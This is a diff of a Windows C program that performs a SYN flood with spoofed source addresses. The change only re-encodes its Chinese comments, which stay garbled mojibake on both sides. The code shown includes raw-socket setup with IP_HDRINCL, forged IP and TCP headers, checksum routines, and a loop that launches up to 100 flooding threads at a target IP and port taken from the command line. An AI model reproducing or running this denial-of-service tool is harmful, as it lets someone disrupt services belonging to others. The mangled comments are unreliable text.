@@ -6,12 +6,12 @@
 #define SEQ 0x28376839
 
 int threadnum, maxthread, port;
-char *DestIP;//Ä¿±êIP
+char *DestIP;//ç›®æ ‡IP
 
-void display(void)  // ¶¨Òå×´Ì¬ÌáÊ¾º¯Êı 
+void display(void)  // å®šä¹‰çŠ¶æ€æç¤ºå‡½æ•° 
 {
 	static int play = 0;
-	// ½ø¶ÈÌõ 
+	// è¿›åº¦æ¡ 
 	char *plays[12] =
 	{
 		" | ",
@@ -32,47 +32,47 @@ void display(void)  // ¶¨Òå×´Ì¬ÌáÊ¾º¯Êı
 	play = (play == 11) ? 0 : play + 1;
 }
 
-//¶¨ÒåÒ»¸ötcphdr½á¹¹À´´æ·ÅTCPÊ×²¿
+//å®šä¹‰ä¸€ä¸ªtcphdrç»“æ„æ¥å­˜æ”¾TCPé¦–éƒ¨
 typedef struct tcphdr
 {
-	USHORT th_sport;//16Î»Ô´¶Ë¿ÚºÅ
-	USHORT th_dport;//16Î»Ä¿µÄ¶Ë¿ÚºÅ
-	unsigned int th_seq;//32Î»ĞòÁĞºÅ
-	unsigned int th_ack;//32Î»È·ÈÏºÅ
-	unsigned char th_lenres;//4Î»Ê×²¿³¤¶È+6Î»±£Áô×ÖÖĞµÄ4Î»
-	unsigned char th_flag;////6Î»±êÖ¾Î»
-	USHORT th_win;//16Î»´°¿Ú´óĞ¡
-	USHORT th_sum;//16Î»Ğ§ÑéºÍ
-	USHORT th_urp;//16Î»½ô¼±Êı¾İÆ«ÒÆÁ¿
+	USHORT th_sport;//16ä½æºç«¯å£å·
+	USHORT th_dport;//16ä½ç›®çš„ç«¯å£å·
+	unsigned int th_seq;//32ä½åºåˆ—å·
+	unsigned int th_ack;//32ä½ç¡®è®¤å·
+	unsigned char th_lenres;//4ä½é¦–éƒ¨é•¿åº¦+6ä½ä¿ç•™å­—ä¸­çš„4ä½
+	unsigned char th_flag;////6ä½æ ‡å¿—ä½
+	USHORT th_win;//16ä½çª—å£å¤§å°
+	USHORT th_sum;//16ä½æ•ˆéªŒå’Œ
+	USHORT th_urp;//16ä½ç´§æ€¥æ•°æ®åç§»é‡
 }TCP_HEADER;
 
-//¶¨ÒåÒ»¸öiphdrÀ´´æ·ÅIPÊ×²¿
-typedef struct iphdr//ipÊ×²¿
+//å®šä¹‰ä¸€ä¸ªiphdræ¥å­˜æ”¾IPé¦–éƒ¨
+typedef struct iphdr//ipé¦–éƒ¨
 {
-	unsigned char h_verlen;//4Î»Ê×²¿³¤¶È£¬ºÍ4Î»IP°æ±¾ºÅ
-	unsigned char tos;//8Î»ÀàĞÍ·şÎñ
-	unsigned short total_len;//16Î»×Ü³¤¶È
-	unsigned short ident;//16Î»±êÖ¾
-	unsigned short frag_and_flags;//3Î»±êÖ¾Î»£¨ÈçSYN,ACK,µÈµÈ)
-	unsigned char ttl;//8Î»Éú´æÊ±¼ä
-	unsigned char proto;//8Î»Ğ­Òé
-	unsigned short checksum;//ipÊÖ²¿Ğ§ÑéºÍ
-	unsigned int sourceIP;//Î±ÔìIPµØÖ·
-	unsigned int destIP;//¹¥»÷µÄipµØÖ·
+	unsigned char h_verlen;//4ä½é¦–éƒ¨é•¿åº¦ï¼Œå’Œ4ä½IPç‰ˆæœ¬å·
+	unsigned char tos;//8ä½ç±»å‹æœåŠ¡
+	unsigned short total_len;//16ä½æ€»é•¿åº¦
+	unsigned short ident;//16ä½æ ‡å¿—
+	unsigned short frag_and_flags;//3ä½æ ‡å¿—ä½ï¼ˆå¦‚SYN,ACK,ç­‰ç­‰)
+	unsigned char ttl;//8ä½ç”Ÿå­˜æ—¶é—´
+	unsigned char proto;//8ä½åè®®
+	unsigned short checksum;//ipæ‰‹éƒ¨æ•ˆéªŒå’Œ
+	unsigned int sourceIP;//ä¼ªé€ IPåœ°å€
+	unsigned int destIP;//æ”»å‡»çš„ipåœ°å€
 }IP_HEADER;
 
-//TCPÎ±Ê×²¿£¬ÓÃÓÚ½øĞĞTCPĞ§ÑéºÍµÄ¼ÆËã£¬±£Ö¤TCPĞ§ÑéµÄÓĞĞ§ĞÔ
+//TCPä¼ªé¦–éƒ¨ï¼Œç”¨äºè¿›è¡ŒTCPæ•ˆéªŒå’Œçš„è®¡ç®—ï¼Œä¿è¯TCPæ•ˆéªŒçš„æœ‰æ•ˆæ€§
 struct
 {
-	unsigned long saddr;//Ô´µØÖ·
-	unsigned long daddr;//Ä¿µÄµØÖ·
-	char mbz;//ÖÃ¿Õ
-	char ptcl;//Ğ­ÒéÀàĞÍ
-	unsigned short tcpl;//TCP³¤¶È
+	unsigned long saddr;//æºåœ°å€
+	unsigned long daddr;//ç›®çš„åœ°å€
+	char mbz;//ç½®ç©º
+	char ptcl;//åè®®ç±»å‹
+	unsigned short tcpl;//TCPé•¿åº¦
 }PSD_HEADER;
 
-//¼ÆËãĞ§ÑéºÍº¯Êı£¬ÏÈ°ÑIPÊ×²¿µÄĞ§ÑéºÍ×Ö¶ÎÉèÎª0(IP_HEADER.checksum=0)
-//È»ºó¼ÆËãÕû¸öIPÊ×²¿µÄ¶ş½øÖÆ·´ÂëµÄºÍ¡£
+//è®¡ç®—æ•ˆéªŒå’Œå‡½æ•°ï¼Œå…ˆæŠŠIPé¦–éƒ¨çš„æ•ˆéªŒå’Œå­—æ®µè®¾ä¸º0(IP_HEADER.checksum=0)
+//ç„¶åè®¡ç®—æ•´ä¸ªIPé¦–éƒ¨çš„äºŒè¿›åˆ¶åç çš„å’Œã€‚
 USHORT checksum(USHORT *buffer, int size)
 {
 	unsigned long cksum = 0;
@@ -86,7 +86,7 @@ USHORT checksum(USHORT *buffer, int size)
 	return (USHORT)(~cksum);
 }
 
-DWORD WINAPI SynfloodThread(LPVOID lp)//synfloodÏß³Ìº¯Êı
+DWORD WINAPI SynfloodThread(LPVOID lp)//synfloodçº¿ç¨‹å‡½æ•°
 {
 
 	SOCKET  sock = NULL;
@@ -103,27 +103,27 @@ DWORD WINAPI SynfloodThread(LPVOID lp)//synfloodÏß³Ìº¯Êı
 		return 0;
 	}
 
-	//ÉèÖÃIP_HDRINCLÒÔ±ã×Ô¼ºÌî³äIPÊ×²¿
+	//è®¾ç½®IP_HDRINCLä»¥ä¾¿è‡ªå·±å¡«å……IPé¦–éƒ¨
 	ErrorCode = setsockopt(sock, IPPROTO_IP, IP_HDRINCL, (char *)&flag, sizeof(int));
 	if (ErrorCode == SOCKET_ERROR)
 	{
 		printf("Set sockopt failed: %d\n", WSAGetLastError());
 		return 0;
 	}
-	//ÉèÖÃ·¢ËÍ³¬Ê±
+	//è®¾ç½®å‘é€è¶…æ—¶
 	ErrorCode = setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, (char*)&TimeOut, sizeof(TimeOut));
 	if (ErrorCode == SOCKET_ERROR)
 	{
 		printf("Set sockopt time out failed: %d\n", WSAGetLastError());
 		return 0;
 	}
-	//ÉèÖÃÄ¿±êµØÖ·
+	//è®¾ç½®ç›®æ ‡åœ°å€
 	memset(&sockAddr, 0, sizeof(sockAddr));
 	sockAddr.sin_family = AF_INET;
 	sockAddr.sin_addr.s_addr = inet_addr(DestIP);
 	FakeIpNet = inet_addr(DestIP);
 	FakeIpHost = ntohl(FakeIpNet);
-	//Ìî³äIPÊ×²¿
+	//å¡«å……IPé¦–éƒ¨
 	ipheader.h_verlen = (4 << 4 | sizeof(IP_HEADER) / sizeof(unsigned long));
 	ipheader.total_len = htons(sizeof(IP_HEADER)+sizeof(TCP_HEADER));
 	ipheader.ident = 1;
@@ -133,7 +133,7 @@ DWORD WINAPI SynfloodThread(LPVOID lp)//synfloodÏß³Ìº¯Êı
 	ipheader.checksum = 0;
 	ipheader.sourceIP = htonl(FakeIpHost + SendSEQ);
 	ipheader.destIP = inet_addr(DestIP);
-	//Ìî³äTCPÊ×²¿
+	//å¡«å……TCPé¦–éƒ¨
 	tcpheader.th_dport = htons(port);
 	tcpheader.th_sport = htons(8080);
 	tcpheader.th_seq = htonl(SEQ + SendSEQ);
@@ -160,7 +160,7 @@ DWORD WINAPI SynfloodThread(LPVOID lp)//synfloodÏß³Ìº¯Êı
 		tcpheader.th_sport = htons(SendSEQ);
 		tcpheader.th_sum = 0;
 		PSD_HEADER.saddr = ipheader.sourceIP;
-		//°ÑTCPÎ±Ê×²¿ºÍTCPÊ×²¿¸´ÖÆµ½Í¬Ò»»º³åÇø²¢¼ÆËãTCPĞ§ÑéºÍ
+		//æŠŠTCPä¼ªé¦–éƒ¨å’ŒTCPé¦–éƒ¨å¤åˆ¶åˆ°åŒä¸€ç¼“å†²åŒºå¹¶è®¡ç®—TCPæ•ˆéªŒå’Œ
 		memcpy(sendBuf, &PSD_HEADER, sizeof(PSD_HEADER));
 		memcpy(sendBuf + sizeof(PSD_HEADER), &tcpheader, sizeof(tcpheader));
 		tcpheader.th_sum = checksum((USHORT *)sendBuf, sizeof(PSD_HEADER)+sizeof(tcpheader));
@@ -203,10 +203,10 @@ int main(int argc, char* argv[])
 	usage(argv[1]);
 
 	int ErrorCode = 0;
-	DestIP = argv[1];//È¡µÃÄ¿±êÖ÷»úIP
-	port = atoi(argv[2]);//È¡µÃÄ¿±ê¶Ë¿ÚºÅ
+	DestIP = argv[1];//å–å¾—ç›®æ ‡ä¸»æœºIP
+	port = atoi(argv[2]);//å–å¾—ç›®æ ‡ç«¯å£å·
 	maxthread = (maxthread > 100) ? 100 : atoi(argv[3]);
-	//Èç¹ûÏß³ÌÊı´óÓÚ100Ôò°ÑÏß³ÌÊıÉèÖÃÎª100
+	//å¦‚æœçº¿ç¨‹æ•°å¤§äº100åˆ™æŠŠçº¿ç¨‹æ•°è®¾ç½®ä¸º100
 
 	WSADATA wsaData;
 
@@ -219,7 +219,7 @@ int main(int argc, char* argv[])
 
 	printf("[start]...........\nPress any key to stop!\n");
 
-	while (threadnum < maxthread)//Ñ­»·´´½¨Ïß³Ì
+	while (threadnum < maxthread)//å¾ªç¯åˆ›å»ºçº¿ç¨‹
 	{
 		if (CreateThread(NULL, 0, SynfloodThread, 0, 0, 0))
 		{
